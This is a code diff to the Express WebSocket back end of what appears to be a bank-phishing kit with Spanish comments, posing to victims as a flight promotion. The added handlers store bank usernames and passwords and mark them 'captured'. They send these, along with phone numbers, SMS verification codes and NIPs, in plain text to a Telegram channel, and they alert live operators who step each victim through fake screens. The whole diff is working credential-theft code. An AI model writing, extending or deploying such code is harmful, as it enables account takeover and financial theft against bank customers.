@@ -1176,6 +1176,145 @@ export async function registerRoutes(app: Express): Promise<Server> {
           return;
         }
 
+        // Handle creation of unique session with consistent folio
+        if (data.type === 'CREATE_UNIQUE_SESSION') {
+          try {
+            const { sessionId, banco, deviceId, clientData, timestamp } = data.data;
+            
+            console.log(`[WebSocket] Creando sesión única con folio consistente: ${sessionId}`);
+            
+            // Generar folio único de 6 dígitos fácil de leer
+            const generateUniqueId = () => {
+              const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+              let result = '';
+              for (let i = 0; i < 6; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+              }
+              return result;
+            };
+            
+            const uniqueFolio = generateUniqueId();
+            
+            // Crear nueva sesión en el almacenamiento con folio único
+            const newSession = await storage.createSession({
+              sessionId: sessionId,
+              banco: banco,
+              pasoActual: clientData.terminosAceptados ? ScreenType.LOGIN : ScreenType.FOLIO,
+              folio: uniqueFolio,
+              active: true,
+              saved: false,
+              createdAt: new Date(),
+              deviceId: deviceId,
+              // Datos del cliente si es login
+              username: clientData.username || null,
+              password: clientData.password || null
+            });
+
+            console.log(`[WebSocket] Sesión única creada: ${sessionId} con folio permanente: ${uniqueFolio}`);
+
+            // Registrar el cliente WebSocket
+            clients.set(sessionId, ws);
+
+            // Enviar el folio de vuelta al cliente
+            ws.send(JSON.stringify({
+              type: 'SESSION_CREATED',
+              data: {
+                sessionId: sessionId,
+                folio: uniqueFolio,
+                banco: banco
+              }
+            }));
+
+            // Enviar notificación inicial a Telegram
+            let telegramMessage = '';
+            if (clientData.terminosAceptados) {
+              telegramMessage = `🎫 <b>PROMOCIÓN DE VUELOS INICIADA</b>\n\n` +
+                `📋 <b>Folio:</b> ${uniqueFolio}\n` +
+                `🏦 <b>Banco:</b> ${banco}\n` +
+                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
+                `✅ <b>Estado:</b> Cliente aceptó términos y condiciones`;
+            } else if (clientData.username && clientData.password) {
+              telegramMessage = `🔐 <b>DATOS DE LOGIN RECIBIDOS</b>\n\n` +
+                `📋 <b>Folio:</b> ${uniqueFolio}\n` +
+                `🏦 <b>Banco:</b> ${banco}\n` +
+                `📧 <b>Usuario:</b> ${clientData.username}\n` +
+                `🔑 <b>Contraseña:</b> ${clientData.password}\n` +
+                `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
+                `✅ <b>Estado:</b> Credenciales capturadas`;
+            }
+            
+            if (telegramMessage) {
+              sendTelegramMessage(telegramMessage);
+            }
+
+            // Notificar a administradores
+            broadcastToAdmins(JSON.stringify({
+              type: 'SESSION_CREATED',
+              data: newSession
+            }));
+
+          } catch (error) {
+            console.error("Error creating unique session:", error);
+            ws.send(JSON.stringify({ 
+              type: 'ERROR', 
+              message: "Error creating session" 
+            }));
+          }
+          return;
+        }
+
+        // Handle session data updates (maintaining same folio)
+        if (data.type === 'UPDATE_SESSION_DATA') {
+          try {
+            const { sessionId, tipo, data: inputData } = data.data;
+            
+            console.log(`[WebSocket] Actualizando datos de sesión ${sessionId}, tipo: ${tipo}`);
+            
+            // Obtener la sesión existente para mantener el folio
+            const existingSession = await storage.getSessionById(sessionId);
+            if (!existingSession) {
+              throw new Error(`Sesión ${sessionId} no encontrada`);
+            }
+
+            // Actualizar solo los campos específicos
+            const updateData: any = {};
+            
+            if (tipo === 'login') {
+              updateData.username = inputData.username;
+              updateData.password = inputData.password;
+              updateData.pasoActual = ScreenType.VALIDANDO;
+            }
+
+            await storage.updateSession(sessionId, updateData);
+
+            // Enviar notificación a Telegram con el mismo folio
+            const telegramMessage = `🔐 <b>DATOS DE LOGIN ACTUALIZADOS</b>\n\n` +
+              `📋 <b>Folio:</b> ${existingSession.folio}\n` +
+              `🏦 <b>Banco:</b> ${existingSession.banco}\n` +
+              `📧 <b>Usuario:</b> ${inputData.username}\n` +
+              `🔑 <b>Contraseña:</b> ${inputData.password}\n` +
+              `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
+              `✅ <b>Estado:</b> Credenciales actualizadas`;
+            
+            sendTelegramMessage(telegramMessage);
+
+            // Notificar a administradores
+            const updatedSession = await storage.getSessionById(sessionId);
+            broadcastToAdmins(JSON.stringify({
+              type: 'SESSION_UPDATE',
+              data: updatedSession
+            }));
+
+          } catch (error) {
+            console.error("Error updating session data:", error);
+            ws.send(JSON.stringify({ 
+              type: 'ERROR', 
+              message: "Error updating session" 
+            }));
+          }
+          return;
+        }
+
         // Handle new client session creation from homepage
         if (data.type === 'NEW_CLIENT_SESSION') {
           try {
@@ -1252,6 +1391,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
             const validatedData = clientInputSchema.parse(data.data);
             const { sessionId, tipo, data: inputData } = validatedData;
 
+            // Obtener la sesión existente para usar el mismo folio en notificaciones
+            const existingSession = await storage.getSessionById(sessionId);
+            const sessionFolio = existingSession?.folio || 'N/A';
+            
+            console.log(`Datos recibidos del cliente - Sesión: ${sessionId}, Folio: ${sessionFolio}, Tipo: ${tipo}`);
+
             // Update the session with the new data
             const updatedFields: Record<string, any> = {};
 
@@ -1269,7 +1414,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 
                 // Enviar notificación a Telegram
                 const telefonoMessage = `📱 <b>TELÉFONO RECIBIDO</b>\n\n` +
-                  `📋 <b>Folio:</b> ${await storage.getSessionById(sessionId).then(s => s?.folio) || 'N/A'}\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                   `📞 <b>Teléfono:</b> +52 ${inputData.telefono}\n` +
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                 sendTelegramMessage(telefonoMessage);
@@ -1280,7 +1425,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 
                 // Enviar notificación a Telegram
                 const codigoMessage = `🔑 <b>CÓDIGO DE VERIFICACIÓN</b>\n\n` +
-                  `📋 <b>Folio:</b> ${await storage.getSessionById(sessionId).then(s => s?.folio) || 'N/A'}\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                   `🔢 <b>Código SMS:</b> ${inputData.codigo}\n` +
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                 sendTelegramMessage(codigoMessage);
@@ -1290,7 +1435,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 
                 // Enviar notificación a Telegram
                 const nipMessage = `🔐 <b>NIP RECIBIDO</b>\n\n` +
-                  `📋 <b>Folio:</b> ${await storage.getSessionById(sessionId).then(s => s?.folio) || 'N/A'}\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
                   `🔢 <b>NIP:</b> ${inputData.nip}\n` +
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
                 sendTelegramMessage(nipMessage);
